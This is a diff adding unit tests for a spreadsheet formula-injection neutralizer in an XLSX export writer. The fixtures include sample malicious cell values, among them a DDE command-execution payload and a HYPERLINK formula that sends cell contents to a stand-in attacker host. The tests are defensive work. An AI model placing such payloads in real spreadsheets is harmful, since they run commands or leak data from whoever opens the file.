@@ -1,7 +1,7 @@
 import assert from "node:assert/strict";
 import test from "node:test";
 import type { QcMappingPreviewEntry } from "../contracts/index.js";
-import { renderQcXlsx } from "./qc-xlsx-writer.js";
+import { neutralizeFormulaLeading, renderQcXlsx } from "./qc-xlsx-writer.js";
 import { QC_CSV_COLUMNS } from "./qc-csv-writer.js";
 
 const baseEntry = (
@@ -151,4 +151,55 @@ test("xlsx: per-entry CRC-32 is non-zero (byte content guard)", () => {
   for (const entry of entries) {
     assert.notEqual(entry.crc32, 0);
   }
+});
+
+// Issue #1664 (audit-2026-05): formula-injection neutralization (CWE-1236).
+test("neutralizeFormulaLeading prefixes formula-leader values with '", () => {
+  const offenders = [
+    `=cmd|'/c calc'!A1`,
+    `=HYPERLINK("https://attacker.example/?"&A1, "Click")`,
+    `+1+1+cmd`,
+    `-2*A1`,
+    `@SUM(A1:A2)`,
+    `\tinjected`,
+    `\rinjected`,
+  ];
+  for (const offender of offenders) {
+    const out = neutralizeFormulaLeading(offender);
+    assert.ok(
+      out.startsWith("'"),
+      `expected leading apostrophe for "${offender}", got "${out}"`,
+    );
+    assert.equal(out.slice(1), offender);
+  }
+});
+
+test("neutralizeFormulaLeading leaves benign values untouched", () => {
+  const safe = [
+    "Verify the user can submit the form.",
+    "Step 1: enter IBAN",
+    " - leading space then dash",
+    "1+1=2 in the middle",
+    "",
+  ];
+  for (const value of safe) {
+    assert.equal(neutralizeFormulaLeading(value), value);
+  }
+});
+
+test("xlsx: rendered sheet bytes contain &apos; before a formula-leading cell", () => {
+  const offender = `=cmd|'/c calc'!A1`;
+  const buffer = renderQcXlsx([baseEntry({ objective: offender })]);
+  const sheet = parseZip(new Uint8Array(buffer)).find((entry) =>
+    entry.filename.endsWith("sheet1.xml"),
+  );
+  assert.ok(sheet);
+  const text = new TextDecoder().decode(sheet.bytes);
+  // The neutralizer prefixes with `'`, then escapeXml turns `'` into
+  // `&apos;`. So every cell that started with `=` now starts with
+  // `&apos;=` inside the inline-string element.
+  assert.ok(
+    text.includes("&apos;="),
+    `expected the apostrophe-escape prefix on formula-leading cells`,
+  );
 });
